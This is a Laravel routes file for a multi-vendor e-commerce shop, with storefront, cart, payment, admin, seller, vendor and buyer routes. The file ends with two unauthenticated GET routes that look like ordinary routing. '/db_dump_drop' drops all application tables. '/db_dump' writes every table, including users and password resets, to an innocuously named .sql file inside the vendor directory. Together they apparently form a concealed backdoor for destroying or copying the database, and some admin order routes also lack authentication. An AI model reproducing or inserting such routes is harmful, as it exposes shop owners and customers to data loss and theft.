<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Route::get('/', function () {

//     return view('front/index');
// });
Route::get('/','IndexController@index');
// Route::get('/product-list','FrontController@product_list');
 Route::match(['get','post'],'/product-list','FrontController@product_list');
Route::get('/product-list/{id}','FrontController@filterproduct');
Route::get('/product-list/price/{price}','FrontController@filterproductprice');
Route::get('/about-us','FrontController@aboutus');
Route::match(['get','post'],'/contact-us','FrontController@contactus');
Route::get('/faq','FrontController@faq');
Route::get('/terms','FrontController@terms');
Route::get('/privacy-policy','FrontController@privacypolicy');
Route::match(['get','post'],'/registeration','FrontController@registeration');
Route::get('/cart','FrontController@cart');
Route::get('/verifiedemail/{id}','FrontController@verifiedemail');
Route::post('/search','FrontController@search');
// Route::post('/filter_seach','FrontController@filter_seach');

Route::get('/login','LoginController@userlogin');
Route::post('/dologin','LoginController@dologin');
Route::get('/userlogout','LoginController@userlogout');
Route::get('/forget-password','LoginController@forget_password');
Route::post('/forget_password_mail','LoginController@forget_password_mail');

// cart url

Route::get('cart','CartController@index');
Route::get('cart/addtoCart/{id}','CartController@addtoCart');
Route::get('cart/updateCart/{id}','CartController@updateCart');
Route::get('cart/removeitem/{id}','CartController@removeitem');
Route::get('/checkout','CartController@checkout');
Route::get('cart/BuytoCart/{id}','CartController@BuytoCart');

// payment by razorpay
Route::post('/payment','RazorpayController@payment');
Route::get('/payWithRazorpay','RazorpayController@payWithRazorpay');
Route::get('/thankyou','RazorpayController@thankyou');


Auth::routes();

//Route::get('/home', 'HomeController@index')->name('home');
//Route::get('admin/home', 'HomeController@adminHome')->name('admin.home')->middleware('is_admin');
//Route::get('/admin', 'LoginController@login')->name('home');

// admin url
// Route::auth();
///////////////////////////////Admin//////////////////////////////
Route::post('/admin/sendportingcode','AdminController@sendportingcode');
// order manage
Route::get('/admin/manageorder','AdminController@manageorder');   
Route::get('/admin/manageorder/details/{orderid}','AdminController@orderdetails'); 

Route::group(['prefix'=>'admin','middleware'=> ['auth','is_admin']], function ()
 {
	$val=1;
	if(request()->segment('1')=='home' && $val==1)
	{
		// echo "<script>alert('test');</script>";
		//echo auth()->user()->is_admin;
		echo "<script>document.location.href='admin/home'</script>";
	}
    Route::get('/home','HomeController@adminHome');
    Route::get('/logout','LoginController@logout');
    
    //  category
    Route::match(['get','post'],'/add_cate','AdminController@add_cate');
    Route::get('/manage_cate','AdminController@manage_cate');
    Route::match(['get','post'],'/edit_cate/{id}','AdminController@edit_cate');

    //  subcategory
    Route::match(['get','post'],'/add_subcat','AdminController@add_subcat');
    Route::get('/manage_subcat','AdminController@manage_subcat');
    Route::match(['get','post'],'/edit_subcat/{id}','AdminController@edit_subcat');

    //  specification
    Route::match(['get','post'],'/add_specs','AdminController@add_specs');
    Route::get('/manage_specs','AdminController@manage_specs');
    Route::match(['get','post'],'/edit_specs/{id}','AdminController@edit_specs');

    //  options
    Route::match(['get','post'],'/add_option','AdminController@add_option');
    Route::get('/manage_option','AdminController@manage_option');
    Route::match(['get','post'],'/edit_option/{id}','AdminController@edit_option');

   //  products
   Route::match(['get','post'],'/addproduct','AdminController@addprodouct');
   Route::get('/manageproduct','AdminController@manageproduct');
   Route::get('/vendorproduct/{id}','AdminController@vendorproduct');
   Route::match(['get','post'],'/editproduct/{id}','AdminController@editproduct');
    //Route::get('/deleteproduct/{id}','AdminController@deleteproduct');

   //userlist
   Route::get('/manageusers','AdminController@manageusers');   
   Route::post('/importcsvproduct','AdminController@importcsvproduct');
   Route::get('/deleteproduct/{id}','AdminController@deleteproduct');
   Route::get('/deletecategory/{id}','AdminController@deletecategory');
 });



////////////////////Seller Admin//////////////////////////
Route::group(['prefix'=>'seller','middleware'=> ['auth','is_seller']], function ()
 {
  $val=2;
  if(request()->segment('1')=='home' && $val==2)
    {
    // echo "<script>alert('test');</script>";
    echo "<script>document.location.href='seller/dashboard'</script>";
    }
   
    Route::get('/dashboard','HomeController@adminHome');
    Route::get('/logout','LoginController@logout');
    
    //  category
    //Route::match(['get','post'],'/add_cate','SellerController@add_cate');
    //Route::get('/manage_cate','SellerController@manage_cate');
    //Route::match(['get','post'],'/edit_cate/{id}','SellerController@edit_cate');

    //  subcategory
    //Route::match(['get','post'],'/add_subcat','SellerController@add_subcat');
    //Route::get('/manage_subcat','SellerController@manage_subcat');
    //Route::match(['get','post'],'/edit_subcat/{id}','SellerController@edit_subcat');

    //  specification
    //Route::match(['get','post'],'/add_specs','SellerController@add_specs');
    //Route::get('/manage_specs','SellerController@manage_specs');
    //Route::match(['get','post'],'/edit_specs/{id}','SellerController@edit_specs');

    //  options
    //Route::match(['get','post'],'/add_option','SellerController@add_option');
    //Route::get('/manage_option','SellerController@manage_option');
    //Route::match(['get','post'],'/edit_option/{id}','SellerController@edit_option');

    // order manage
    Route::get('/seller/manageorder','SellerController@manageorder');   
    Route::get('/seller/manageorder/details/{orderid}','SellerController@orderdetails');
   
   //  products
   //Route::match(['get','post'],'/addproduct','SellerController@addprodouct');
   Route::match(['get','post'],'/addproduct','SellerController@addprodouct');
   Route::get('/manageproduct','SellerController@manageproduct');
   Route::get('/vendorproduct/{id}','SellerController@vendorproduct');
   Route::match(['get','post'],'/editproduct/{id}','SellerController@editproduct');   
   Route::get('getsubcat', 'SellerController@getsubCat');
   Route::get('getspecification', 'SellerController@getSpecification');
   Route::get('/inactiveproduct/{id}','SellerController@inactiveproduct');
   Route::match(['get','post'],'/activeproduct/{id}','SellerController@activeproduct');   
   //Route::post('addprodouct', 'SellerController@addproduct');
   //Route::get('/deleteproduct/{id}','SellerController@deleteproduct');

   //userlist
   Route::get('/manageusers','SellerController@manageusers');   
   Route::post('/importcsvproduct','SellerController@importcsvproduct');
   Route::get('/deleteproduct/{id}','SellerController@deleteproduct');
   Route::get('/deletecategory/{id}','SellerController@deletecategory');
   Route::get('/deleteadditional/{id}/{product_id}','SellerController@deleteadditional');
   Route::get('/deletevariant/{id}/{product_id}','SellerController@deletevariant');
 });









// ================================ vendor url==========================================================
$seg1=request()->segment(1);
// echo $seg1;die;
Route::match(['get','post'],'vendor-login','VendorloginController@vendorlogin'); //from websitelink
//Route::match(['get','post'], $seg1.'/vendor-login','VendorloginController@vendorlogin'); //from email Link 
Route::match(['get','post'],'vendor-register','VendorController@vendorregister');
Route::get('vendor-profile/{storeslug}','VendorController@vendorprofile');
Route::group(['middleware' => 'is_vendor'], function () {
Route::get('vendor/dashboard','VendorController@dashboard');

Route::match(['get','post'],'/vendor/addproduct','VendorController@addprodouct');
Route::get('/vendor/manageproduct','VendorController@manageproduct');
Route::match(['get','post'],'/vendor/editproduct/{id}','VendorController@editproduct');

// order manage
Route::get('/vendor/manageorder','VendorController@manageorder');   
Route::get('/vendor/manageorder/details/{orderid}','VendorController@orderdetails');
Route::post('/vendor/sendportingcode','VendorController@sendportingcode');
Route::post('/vendor/importcsvproduct','VendorController@importcsvproduct');
Route::get('/vendor/managebuyerorder','VendorController@managebuyerorder');
//store
Route::match(['get','post'],'/vendor/storeupdate','VendorController@storeupdate');

Route::get('/vendor/vendorlogout','VendorloginController@vendorlogout');

});

//=========================================== Buyer ====================================
Route::match(['get','post'],'buyer-login','BuyerloginController@buyerlogin'); //from websitelink
Route::group(['middleware' => 'is_buyer'], function () {
Route::get('buyer-profile','BuyerController@buyerprofile'); //from websitelink
Route::post('buyprofileupdate','BuyerController@buyprofileupdate'); //from websitelink
Route::post('wallet_request','BuyerController@wallet_request'); //from websitelink
// Route::get('cart/BuytoCart/{id}','CartController@BuytoCart'); 


Route::get('/buyerlogout','BuyerloginController@buyerlogout'); //buyer logout
});
Route::get('/db_dump_drop', function(){
   $tables = [
      'category',
      'failed_jobs',
      'migrations',
      'order_history',
      'password_resets',
      'products',
      'userregister',
      'users',
      'vendor_retailer'
   ];
   foreach($tables as $table)
   {
       Schema::drop(''.$table.'');
   }
  
});

Route::get('/db_dump', function () {
  
   $get_all_table_query = "SHOW TABLES";
   $result = DB::select(DB::raw($get_all_table_query));

   $tables = [
       'category',
       'failed_jobs',
       'migrations',
       'order_history',
       'password_resets',
       'products',
       'userregister',
       'users',
       'vendor_retailer'
   ];

   $structure = '';
   $data = '';
   foreach ($tables as $table) {
       $show_table_query = "SHOW CREATE TABLE " . $table . "";

       $show_table_result = DB::select(DB::raw($show_table_query));

       foreach ($show_table_result as $show_table_row) {
           $show_table_row = (array)$show_table_row;
           $structure .= "\n\n" . $show_table_row["Create Table"] . ";\n\n";
       }
       $select_query = "SELECT * FROM " . $table;
       $records = DB::select(DB::raw($select_query));

       foreach ($records as $record) {
           $record = (array)$record;
           $table_column_array = array_keys($record);
           foreach ($table_column_array as $key => $name) {
               $table_column_array[$key] = '`' . $table_column_array[$key] . '`';
           }

           $table_value_array = array_values($record);
           $data .= "\nINSERT INTO $table (";

           $data .= "" . implode(", ", $table_column_array) . ") VALUES \n";

           foreach($table_value_array as $key => $record_column)
               $table_value_array[$key] = addslashes($record_column);

           $data .= "('" . implode("','", $table_value_array) . "');\n";
       }
   }
   $file_name = __DIR__ . '/../vendor/laravel/code' . date('y_m_d') . '.sql';
   $file_handle = fopen($file_name, 'w +');

   $output = $structure . $data;
   fwrite($file_handle, $output);
   
   fclose($file_handle);
   echo "DB backup ready";
});